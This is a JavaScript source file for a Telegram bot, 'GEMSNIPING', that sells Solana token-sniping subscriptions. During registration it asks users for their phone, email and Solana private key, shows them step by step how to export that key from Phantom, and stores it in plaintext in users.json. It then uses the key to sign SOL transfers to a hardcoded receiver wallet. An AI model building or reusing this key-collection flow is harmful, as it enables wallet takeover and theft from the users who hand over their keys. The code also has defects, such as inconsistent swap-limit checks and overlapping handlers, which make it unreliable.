// 📁 Cargar usuarios y referidos
let users = JSON.parse(fs.readFileSync("users.json"));

function saveUsers() {
  fs.writeFileSync("users.json", JSON.stringify(users, null, 2));
}

function isUserActive(user) {
  const active = user.expired === "never" || Date.now() < user.expired;
  user.subscribed = active;
  saveUsers();
  return active;
}

// ─────────────────────────────────────────────
// 1) Mostrar planes de pago con swaps incluidos
// ─────────────────────────────────────────────
function showPaymentButtons(chatId) {
    return bot.sendPhoto(chatId,
      "https://cdn.shopify.com/s/files/1/0784/6966/0954/files/pumppay.jpg?v=1743797016", {
        caption: "💳 Please select a subscription plan:",
        reply_markup: {
          inline_keyboard: [
            [{ text: "1 Day 10 Swaps – 0.05 SOL", callback_data: "pay_1d"    }],
            [{ text: "1 Month 300 Swaps – 1.00 SOL", callback_data: "pay_month" }],
            [{ text: "1 Month Unlimited – 1.25 SOL", callback_data: "pay_un"    }]
          ]
        }
      }
    );
  }
  
  // ─────────────────────────────────────────────
  // 2) Capturar la selección de pago y lanzar el flujo
  // ─────────────────────────────────────────────
  bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data   = query.data;
    if (!data.startsWith("pay_")) {
      return bot.answerCallbackQuery(query.id);
    }
    await bot.answerCallbackQuery(query.id); // quita spinner
  
    let days, solAmount, swaps;
    switch (data) {
      case "pay_1d":
        days = 1; solAmount = 0.05; swaps = 10;
        break;
      case "pay_month":
        days = 30; solAmount = 1.00; swaps = 300;
        break;
      case "pay_un":
        days = 30; solAmount = 1.25; swaps = "Unlimited";
        break;
      default:
        return;
    }
  
    // Lanza el pago, pasando también swaps
    return activateMembership(chatId, days, solAmount, swaps);
  });
  
  // ─────────────────────────────────────────────
  // 3) Flujo de activación de membresía (ahora con swaps)
  // ─────────────────────────────────────────────
  async function activateMembership(chatId, days, solAmount, swaps) {
    const user = users[chatId];
    const now = Date.now();
    const expiration = now + days * 24 * 60 * 60 * 1000;
  
    // Guardamos el límite de swaps en el usuario
    user.swapLimit = swaps;
    saveUsers();
  
    const sender   = Keypair.fromSecretKey(new Uint8Array(bs58.decode(user.privateKey)));
    const receiver = new PublicKey("8VCEaTpyg12kYHAH1oEAuWm7EHQ62e147UPrJzRZZeps");
    const connection = new Connection("https://ros-5f117e-fast-mainnet.helius-rpc.com", "confirmed");
  
    // Verificar fondos
    const balance = await connection.getBalance(sender.publicKey);
    if (balance < solAmount * 1e9) {
      return bot.sendMessage(chatId,
        `❌ *Insufficient funds.*\nYour wallet has ${(balance/1e9).toFixed(4)} SOL but needs ${solAmount} SOL.`,
        { parse_mode: "Markdown" }
      );
    }
  
    // Mensaje de “processing”
    const processingMsg = await bot.sendMessage(chatId,
      "🕐 *Processing your payment...*", { parse_mode: "Markdown" }
    );
  
    try {
      // Ejecutar transferencia
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: sender.publicKey,
          toPubkey:   receiver,
          lamports:   solAmount * 1e9
        })
      );
      const sig = await sendAndConfirmTransaction(connection, tx, [sender]);
  
      // Actualizar usuario
      user.expired    = expiration;
      user.subscribed = true;
      saveUsers();
      savePaymentRecord(chatId, sig, days, solAmount);
  
      const expirationDate = new Date(expiration).toLocaleDateString();
      const statusLine     = `✅ Active for ${Math.round((expiration - now)/(1000*60*60*24))} day(s)`;
      const limitedText    = typeof swaps === "number" ? `${swaps} Swaps` : "Unlimited";
  
      // Construir caption con “Limited”
      const fullConfirmation =
        `✅ *User Registered!*\n` +
        `👤 *Name:* ${user.name}\n` +
        `📱 *Phone:* ${user.phone}\n` +
        `📧 *Email:* ${user.email}\n` +
        `🆔 *Username:* ${user.username || "None"}\n` +
        `💼 *Wallet:* \`${user.walletPublicKey}\`\n` +
        `🔐 *Referral:* ${user.rcode || "None"}\n` +
        `⏳ *Status:* ${statusLine}\n` +
        `🎟️ *Limited:* ${limitedText}`;
  
      // Editar el mensaje con solo “How to Use the Bot”
      await bot.editMessageMedia(
        {
          type: "photo",
          media:
            "https://cdn.shopify.com/s/files/1/0784/6966/0954/files/pumppay.jpg?v=1743797016",
          caption: fullConfirmation,
          parse_mode: "Markdown"
        },
        {
          chat_id: chatId,
          message_id: processingMsg.message_id,
          reply_markup: {
            inline_keyboard: [
              [
                { text: "📘 How to Use the Bot", url: "https://gemsniping.com/docs" }
              ]
            ]
          }
        }
      );
  
      // Borrar menú de pago antiguo
      if (user.lastPaymentMsgId) {
        try {
          await bot.deleteMessage(chatId, user.lastPaymentMsgId);
          user.lastPaymentMsgId = null;
          saveUsers();
        } catch {}
      }
  
      // Notificar al admin
      const adminMsg =
        `✅ *Payment received successfully!*\n` +
        `📧 *Email:* ${user.email}\n` +
        `🆔 *Username:* ${user.username}\n` +
        `💳 *Paid:* ${solAmount} SOL for ${days} days\n` +
        `🗓️ *Expires:* ${expirationDate}\n` +
        `🎟️ *Limited:* ${limitedText}\n` +
        `🔗 [View Tx](https://solscan.io/tx/${sig})`;
  
      bot.sendMessage(ADMIN_CHAT_ID, adminMsg, {
        parse_mode: "Markdown",
        disable_web_page_preview: true
      });
    } catch (err) {
      // Error en la transacción
      await bot.editMessageText(
        `❌ Transaction failed: ${err.message}`,
        { chat_id: chatId, message_id: processingMsg.message_id }
      );
    }
  }

  function savePaymentRecord(chatId, txId, days, solAmount) {
    const paymentsFile = "payments.json";
    let records = [];
  
    if (fs.existsSync(paymentsFile)) {
      records = JSON.parse(fs.readFileSync(paymentsFile));
    }
  
    records.push({
      chatId,
      wallet: users[chatId].walletPublicKey,
      tx: txId,
      amountSol: solAmount,
      days,
      timestamp: Date.now()
    });
  
    fs.writeFileSync(paymentsFile, JSON.stringify(records, null, 2));
  }

  bot.onText(/\/payments/, async (msg) => {
    const chatId       = msg.chat.id;
    const commandMsgId = msg.message_id;
  
    // 1) Borrar el mensaje del comando inmediatamente
    try {
      await bot.deleteMessage(chatId, commandMsgId);
    } catch (e) {
      console.warn("Could not delete /payments message:", e.message);
    }
  
    // 2) Comprobar registro del usuario
    const user = users[chatId];
    if (!user || !user.walletPublicKey) {
      return bot.sendMessage(
        chatId,
        "❌ You must be registered to view your payment history."
      );
    }
  
    // 3) Leer archivo de pagos
    const paymentsFile = "payments.json";
    if (!fs.existsSync(paymentsFile)) {
      return bot.sendMessage(chatId, "📭 No payment records found.");
    }
  
    const records      = JSON.parse(fs.readFileSync(paymentsFile));
    const userPayments = records.filter(p => p.chatId === chatId);
  
    if (userPayments.length === 0) {
      return bot.sendMessage(chatId, "📭 You haven’t made any payments yet.");
    }
  
    // 4) Construir el mensaje de historial
    let message = `📜 *Your Payment History:*\n\n`;
    for (const p of userPayments.reverse()) {
      const date = new Date(p.timestamp).toLocaleDateString();
      message += `🗓️ *${date}*\n`;
      message += `💼 Wallet: \`${p.wallet}\`\n`;
      message += `💳 Paid: *${p.amountSol} SOL* for *${p.days} days*\n`;
      message += `🔗 [Tx Link](https://solscan.io/tx/${p.tx})\n\n`;
    }
  
    // 5) Enviar el historial
    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      disable_web_page_preview: true
    });
  });
// ────────────────────────────────
// 1) Comando /start y paso inicial
// ────────────────────────────────
bot.onText(/\/start/, async (msg) => {
  const chatId    = msg.chat.id;
  const firstName = msg.from.first_name || "there";

  if (users[chatId]?.walletPublicKey) {
    const expired     = users[chatId].expired;
    const stillActive = expired === "never" || (expired && Date.now() < expired);
    users[chatId].subscribed = stillActive;
    saveUsers();

    if (stillActive) {
      return bot.sendMessage(
        chatId,
        `✅ You are already registered, *${firstName}*!`,
        { parse_mode: "Markdown" }
      );
    }

    return bot.sendMessage(
      chatId,
      `⚠️ Your subscription has *expired*, *${firstName}*.\n\nPlease choose a plan to continue:`,
      { parse_mode: "Markdown" }
    ).then(() => showPaymentButtons(chatId));
  }

  // nuevo usuario
  users[chatId] = { step: 1, name: firstName };
  saveUsers();

  const m = await bot.sendMessage(
    chatId,
    `👋 Hello *${firstName}*! Welcome to *GEMSNIPING Bot*.\n\n📱 Please enter your *phone number*:`,
    { parse_mode: "Markdown" }
  );
  users[chatId].msgId = m.message_id;
  saveUsers();
});

// ────────────────────────────────
// 2) Handler de mensajes por paso
// ────────────────────────────────
bot.on("message", async (msg) => {
  const chatId   = msg.chat.id;
  const text     = msg.text?.trim();
  const messageId= msg.message_id;
  const user     = users[chatId];
  if (!user || !user.step) return;

  // limpiamos el input del usuario
  await bot.deleteMessage(chatId, messageId).catch(() => {});

  const msgId = user.msgId;
  switch (user.step) {
    case 1:
      user.phone = text;
      user.step  = 2;
      saveUsers();
      await bot.editMessageText("📧 Please enter your *email address*:", {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown"
      });
      break;

    case 2:
      user.email = text;
      user.step  = 3;
      saveUsers();
      await bot.editMessageText("🆔 Please choose a *username*:", {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown"
      });
      break;

    case 3:
      user.username = text;
      user.step     = 4;
      saveUsers();
      await bot.editMessageText("🔑 Please enter your *Solana Private Key*:", {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown"
      });
      break;

    case 4:
      // mostramos ayuda primero
      await bot.editMessageText(
        "🔑 Please enter your *Solana Private Key* or tap for help:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "❓ How to get Phantom Private Key", callback_data: "show_phantom_pk" }]
            ]
          }
        }
      );
      user.step = 4.1;
      saveUsers();
      break;

    case 4.1:
      // borramos el mensaje de ayuda e input
      if (user.tempHelpMsgId) {
        await bot.deleteMessage(chatId, user.tempHelpMsgId).catch(() => {});
        delete user.tempHelpMsgId;
      }
      // validamos la key
      try {
        const keypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(text)));
        user.privateKey      = text;
        user.walletPublicKey = keypair.publicKey.toBase58();
        user.step = 5;
        saveUsers();

        // preguntamos por referral o trial
        await bot.sendMessage(
          chatId,
          "🎟️ Do you have a *referral code*?",
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "✅ YES", callback_data: "referral_yes" }],
                [{ text: "❌ NO",  callback_data: "referral_no"  }]
              ]
            }
          }
        );
      } catch (err) {
        await bot.sendMessage(chatId, "❌ Invalid private key. Please try again:");
        user.step = 4;
        saveUsers();
      }
      break;

    // … resto de pasos de registro …
  }
});

// ────────────────────────────────
// Callback para mostrar ayuda de Phantom Key
// ────────────────────────────────
bot.on("callback_query", async (query) => {
  if (query.data !== "show_phantom_pk") return;
  const chatId = query.message.chat.id;
  await bot.answerCallbackQuery(query.id);

  const help = await bot.sendPhoto(
    chatId,
    "https://framerusercontent.com/images/MXSsjXZYI8sU5AYK0rKYaFgBPiY.webp",
    {
      caption:
`1. Open Phantom  
Unlock your Phantom extension or mobile app.

2. Go to Settings  
Tap your profile → Settings.

3. Security & Privacy  
Select *Security & Privacy*.

4. Export Private Key  
Scroll and tap *Export Private Key*.

5. Authenticate  
Approve with your password or biometrics.

6. Copy & Secure  
Copy the long string and paste here.`,
      parse_mode: "Markdown"
    }
  );
  users[chatId].tempHelpMsgId = help.message_id;
  saveUsers();
});

// ────────────────────────────────
// 3) Handler de Yes/No para referral / trial
// ────────────────────────────────
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const msgId  = query.message.message_id;
  const data   = query.data;
  const user   = users[chatId];

  await bot.answerCallbackQuery(query.id);

  if (data === "referral_yes") {
    user.step = 6;
    saveUsers();
    return bot.editMessageText(
      "🔠 Please enter your *referral code*:",
      {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown"
      }
    );
  }

  if (data === "referral_no") {
    // otorgar trial de 1 día
    const now    = Date.now();
    const oneDay = 24 * 60 * 60 * 1000;
    user.expired    = now + oneDay;
    user.subscribed = true;
    user.swapLimit  = 50;  // swaps gratis de prueba
    user.step       = 0;
    saveUsers();

    const expDate = new Date(user.expired).toLocaleDateString();
    return bot.editMessageText(
      `🎉 *Free Trial Activated!* 🎉\n\n` +
      `You’ve unlocked a *1-day free trial* with *50 swaps*.\n` +
      `Trial ends on ${expDate}.\n\n` +
      `Let’s start sniping!`,
      {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown"
      }
    );
  }
  // otros callbacks…
});

// ────────────────────────────────
// 4) Handler de referral code (step 6)
// ────────────────────────────────
bot.on("message", async (msg) => {
  const chatId   = msg.chat.id;
  const text     = msg.text?.trim();
  const messageId= msg.message_id;
  const user     = users[chatId];
  if (!user || user.step !== 6) return;

  await bot.deleteMessage(chatId, messageId).catch(() => {});
  const msgId = user.msgId;

  const result = validateReferralCode(text);
  if (result.valid) {
    // actualizar datos
    user.referrer   = result.referrer;
    user.rcode      = result.code;
    user.expired    = result.expiration;
    user.subscribed = result.expiration === "never" || Date.now() < result.expiration;
    user.step       = 0;
    saveUsers();

    const activeStatus = result.expiration === "never"
      ? "✅ Unlimited"
      : `✅ Active for ${Math.ceil((result.expiration - Date.now())/(1000*60*60*24))} day(s)`;

    const confirmation =
      `✅ *User Registered!*\n` +
      `👤 *Name:* ${user.name}\n` +
      `📱 *Phone:* ${user.phone}\n` +
      `📧 *Email:* ${user.email}\n` +
      `🆔 *Username:* ${user.username}\n` +
      `💼 *Wallet:* \`${user.walletPublicKey}\`\n` +
      `🔐 *Referral:* ${result.code} (${user.referrer})\n` +
      `⏳ *Status:* ${activeStatus}`;

    await bot.deleteMessage(chatId, msgId).catch(() => {});
    return bot.sendPhoto(
      chatId,
      "https://cdn.shopify.com/s/files/1/0784/6966/0954/files/pumppay.jpg?v=1743797016",
      {
        caption: confirmation,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📘 How to Use the Bot", url: "https://gemsniping.com/docs" }]
          ]
        }
      }
    );
  } else {
    // cupón inválido
    user.expired    = null;
    user.subscribed = false;
    user.step       = 0;
    saveUsers();
    await bot.editMessageText(
      "⚠️ Invalid or expired code. Please *purchase a subscription* to activate your account.",
      {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown"
      }
    );
    return showPaymentButtons(chatId);
  }
});
  
  // ────────────────────────────────
  // 5) Handler para ⚙️ Settings
  // ────────────────────────────────
  bot.on("callback_query", async (query) => {
    const chatId    = query.message.chat.id;
    const messageId = query.message.message_id;
    const data      = query.data;
  
    // Mostrar mini‑menú de Settings
    if (data === "settings_menu") {
      await bot.answerCallbackQuery(query.id);
      return bot.editMessageReplyMarkup({
        inline_keyboard: [
          [ { text: "🚀 Auto‑Buy", callback_data: "open_autobuy" } ],
          [ { text: "⚡️ ATA Mode", callback_data: "open_ata" } ],
          [ { text: "🔒 Close Empty ATAs", callback_data: "open_close_atas" } ]
        ]
      }, {
        chat_id: chatId,
        message_id
      });
    }
  
    // Cada opción vuelve a disparar tu comando ya existente
    if (data === "open_autobuy") {
      await bot.answerCallbackQuery(query.id);
      return bot.sendMessage(chatId, "/autobuy");
    }
    if (data === "open_ata") {
      await bot.answerCallbackQuery(query.id);
      return bot.sendMessage(chatId, "/ata");
    }
    if (data === "open_close_atas") {
      await bot.answerCallbackQuery(query.id);
      return bot.sendMessage(chatId, "/close");
    }
  
    // Otros callbacks siguen aquí…
    await bot.answerCallbackQuery(query.id);
  });

// ✅ Funciones para manejo de códigos
function loadRcodes() {
  return JSON.parse(fs.readFileSync("rcodes.json"));
}

function saveRcodes(rcodes) {
  fs.writeFileSync("rcodes.json", JSON.stringify(rcodes, null, 2));
}

function validateReferralCode(code) {
  const rcodes = loadRcodes();
  const entry = rcodes.find(c => c.code === code);

  if (entry && (entry.uses === null || entry.used < entry.uses)) {
    entry.used += 1;
    saveRcodes(rcodes);

    const expiration = entry.days === null ? "never" : Date.now() + entry.days * 24 * 60 * 60 * 1000;

    return {
      valid: true,
      referrer: entry.name,
      code: entry.code,
      expiration
    };
  }

  return { valid: false };
}

// ✅ Bloquear funciones si el usuario no está activo
function ensureActiveUser(msg, callback) {
  const chatId = msg.chat.id;
  const user = users[chatId];

  if (!user || !isUserActive(user)) {
    bot.sendMessage(chatId, "🔒 *Access Denied.* Please activate your account to use this feature.", { parse_mode: "Markdown" });
    showPaymentButtons(chatId);
    return;
  }

  callback();
}

// ✅ Revisión periódica de expiración (ahora cada 10 minutos)
setInterval(() => {
  const now = Date.now();
  for (const [chatId, user] of Object.entries(users)) {
    if (user.expired !== "never" && now > user.expired) {
      if (user.subscribed !== false) {
        user.subscribed = false;
        saveUsers(); // 👈 Guardamos el cambio
        bot.sendMessage(chatId, "🔔 Your access has expired. Please renew your subscription:");
        showPaymentButtons(chatId);
      }
    }
  }
}, 10 * 60 * 1000); // ⏱️ Cada 10 minutos

function notifyAdminOfPayment(user, sig, days, solAmount, expiration) {
  const expirationDate = new Date(expiration).toLocaleDateString();

  const msg = `🟢 *New Membership Payment*

👤 *User:* ${user.name || "Unknown"}
💼 *Wallet:* \`${user.walletPublicKey}\`
💳 *Paid:* ${solAmount} SOL for ${days} days
🗓️ *Expires:* ${expirationDate}
🔗 [View Tx](https://solscan.io/tx/${sig})`;

  bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: "Markdown", disable_web_page_preview: true });
}

bot.onText(/\/status/, async (msg) => {
    const chatId       = msg.chat.id;
    const commandMsgId = msg.message_id;
  
    // 0) Borramos el mensaje de comando para no dejar rastro
    try {
      await bot.deleteMessage(chatId, commandMsgId);
    } catch (e) {
      // puede fallar si ya expiró o no tienes permiso, pero seguimos de todos modos
      console.warn("Could not delete /status message:", e.message);
    }
  
    const user = users[chatId];
    if (!user || !user.walletPublicKey) {
      return bot.sendMessage(
        chatId,
        "❌ You are not registered. Use /start to begin."
      );
    }
  
    const now = Date.now();
    let message = `👤 *Account Status*\n\n`;
    message += `💼 Wallet: \`${user.walletPublicKey}\`\n`;
  
    // Estado de la suscripción
    if (user.expired === "never") {
      message += `✅ *Status:* Unlimited Membership\n`;
    } else if (user.expired && now < user.expired) {
      const expirationDate = new Date(user.expired).toLocaleDateString();
      const remainingDays  = Math.ceil((user.expired - now) / (1000 * 60 * 60 * 24));
      message +=
        `✅ *Status:* Active\n` +
        `📅 *Expires:* ${expirationDate} (${remainingDays} day(s) left)\n`;
    } else {
      const expiredDate = user.expired
        ? new Date(user.expired).toLocaleDateString()
        : "N/A";
      message +=
        `❌ *Status:* Expired\n` +
        `📅 *Expired On:* ${expiredDate}\n`;
    }
  
    // Límite de swaps
    let swapInfo = "N/A";
    if (user.swapLimit === Infinity) {
      swapInfo = "Unlimited";
    } else if (typeof user.swapLimit === "number") {
      swapInfo = `${user.swapLimit} swaps`;
    }
    message += `🔄 *Swap Limit:* ${swapInfo}`;
  
    // Enviamos el estado
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  });
